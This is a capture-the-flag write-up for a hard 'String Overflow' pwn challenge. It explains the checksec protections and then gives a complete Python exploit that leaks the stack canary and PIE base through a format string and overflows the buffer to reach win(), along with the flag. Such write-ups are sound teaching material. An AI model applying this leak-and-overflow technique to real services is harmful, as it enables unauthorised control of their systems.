# String Overflow

## Overview
Writeup for **String Overflow** from Override CTF 2026.

## Category
Pwn

## Difficulty
Hard

## Description
The challenge combined two classic memory corruption vulnerabilities into a single binary. The hint stated: *"Some outputs talk too much, and some inputs go too far,"* indicating a Format String vulnerability for memory disclosure and a Buffer Overflow for control flow hijacking.

## Initial Analysis
Checking the binary with `checksec` revealed modern protections:
- **NX (No-Execute):** Stack is not executable.
- **Stack Canary:** Protects against simple overflows by checking a secret value before returning.
- **PIE (Position Independent Executable):** Base address is randomized at runtime.

Because of these protections, a standard buffer overflow would fail. The exploit required a two-stage attack:
1. **Memory Leak:** Use the format string bug to leak the **Stack Canary** and **PIE base address**.
2. **Execution Hijack:** Use the leaked values to bypass protections, overflow the buffer, and redirect execution to a hidden `win()` function.

## Tools Used
- `GDB` (with GEF/pwndbg)
- `checksec`
- `Python 3` (Socket & Struct)
- `nm` / `objdump`

## Approach
1. **Identify Format String Offsets:** Find the stack positions for the canary and a return address to calculate the binary base.
2. **Locate win() Function:** Identify the static offset of the `win()` function within the binary.
3. **Stage 1 (Leaking):** Send positional format specifiers (e.g., `%23$p`) to the service and parse the leaked hex values.
4. **Stage 2 (Exploitation):** Build a payload that preserves the leaked canary and overwrites the RIP with the calculated runtime address of `win()`.

## Steps to Solve
```python
import socket
import struct
import re
import time
import select

HOST = "34.93.2.73"
PORT = 10015

def recv_until(sock, marker):
    data = b""
    while marker not in data:
        chunk = sock.recv(4096)
        if not chunk: break
        data += chunk
    return data

# 1. Establish Connection
s = socket.create_connection((HOST, PORT))

# 2. Stage 1: Leak Canary and PIE Address
# %23$p = Canary | %31$p = Address in main
s.sendall(b"%23$p.%31$p\n")

data = recv_until(s, b"input:")
print("[*] Leaked Data Context:\n", data.decode(errors="ignore"))

# Extract the hex values using regex
match = re.search(rb"(0x[0-9a-fA-F]+)\.(0x[0-9a-fA-F]+)", data)
if not match:
    print("[-] Failed to find leaks.")
    exit()

canary = int(match.group(1), 16)
main_leak = int(match.group(2), 16)

# Calculate static offsets (derived from local analysis)
base_address = main_leak - 0x12ec
win_function = base_address + 0x11a9

print(f"[+] Recovered Canary: {hex(canary)}")
print(f"[+] Binary Base:      {hex(base_address)}")
print(f"[+] Target win():     {hex(win_function)}")

# 3. Stage 2: Buffer Overflow
# Padding (72) + Canary (8) + RBP (8) + RIP (8)
payload = b"A" * 72
payload += struct.pack("<Q", canary)
payload += b"B" * 8
payload += struct.pack("<Q", win_function)
payload += b"\n"

print("[*] Sending overflow payload...")
s.sendall(payload)

time.sleep(0.3)

# 4. Capture Flag
while True:
    ready, _, _ = select.select([s], [], [], 2)
    if not ready: break
    output = s.recv(4096)
    if not output: break
    print(output.decode(errors="ignore"), end="")
```

## Flag
`OVRD{f0rm4t_l34k_th3n_b0f_t0_c0ntr0l_fl0w_7b2d9e6c1a}`

## What I Learned
- **Chained Vulnerabilities:** Why memory disclosure (leaks) is often the prerequisite for modern exploitation.
- **Stack Canary Preservation:** Learning to overwrite around the canary without triggering a `stack smashing detected` error.
- **PIE/ASLR Bypass:** Using relative offsets to calculate runtime function addresses.

## References
_N/A_
